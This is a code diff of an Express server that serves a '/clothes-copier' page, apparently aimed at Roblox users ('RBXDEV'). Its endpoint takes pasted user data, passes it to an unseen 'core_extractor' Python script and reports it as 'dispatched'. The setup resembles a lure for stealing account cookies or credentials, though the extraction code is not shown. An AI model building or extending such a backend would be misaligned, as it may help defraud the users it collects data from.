@@ -1,37 +1,59 @@
 const express = require('express');
-const { spawn } = require('child_process');
 const path = require('path');
+const { spawn } = require('child_process');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-app.use(express.json());
+// Middleware
+app.use(express.json({ limit: '10mb' }));
 app.use(express.static(path.join(__dirname, 'public')));
 
+// Routes for Custom URLs
+app.get('/clothes-copier', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
+
+// Automatically redirect root homepage to /clothes-copier
+app.get('/', (req, res) => {
+    res.redirect('/clothes-copier');
+});
+
+// API Processing Endpoint
 app.post('/api/process', (req, res) => {
-    const rawInput = req.body.data;
-    if (!rawInput) {
-        return res.json({ success: false, error: "No input provided" });
+    const { data } = req.body;
+
+    if (!data) {
+        return res.status(400).json({ success: false, error: 'No data provided' });
     }
 
-    // Safely encode payload
-    const encodedPayload = Buffer.from(rawInput).toString('base64');
+    // Base64 encode input data securely to pass into Python script
+    const encodedData = Buffer.from(data).toString('base64');
 
-    // Spawn Python extractor and WAIT for it to finish so it sends on the first try
-    const pythonProcess = spawn('python3', ['core_extractor.py', encodedPayload]);
+    const pythonProcess = spawn('python3', ['core_extractor.py', encodedData], {
+        env: { ...process.env }
+    });
 
-    let errorOutput = '';
-    pythonProcess.stderr.on('data', (data) => {
-        errorOutput += data.toString();
-        console.error(`[Python Log] ${data.toString()}`);
+    let stderrData = '';
+
+    pythonProcess.stderr.on('data', (chunk) => {
+        stderrData += chunk.toString();
+        console.log(`[Python Log] ${chunk.toString().trim()}`);
     });
 
     pythonProcess.on('close', (code) => {
-        console.log(`Python process finished with code ${code}`);
-        res.json({ success: true, code: code });
+        if (code === 0) {
+            res.json({ success: true, message: 'Payload processed and dispatched successfully.' });
+        } else {
+            res.status(500).json({ 
+                success: false, 
+                error: 'Extractor execution failed.', 
+                details: stderrData.trim() 
+            });
+        }
     });
 });
 
 app.listen(PORT, () => {
-    console.log(`Server running on port ${PORT}`);
+    console.log(`🚀 RBXDEV Server running live on port ${PORT}`);
 });
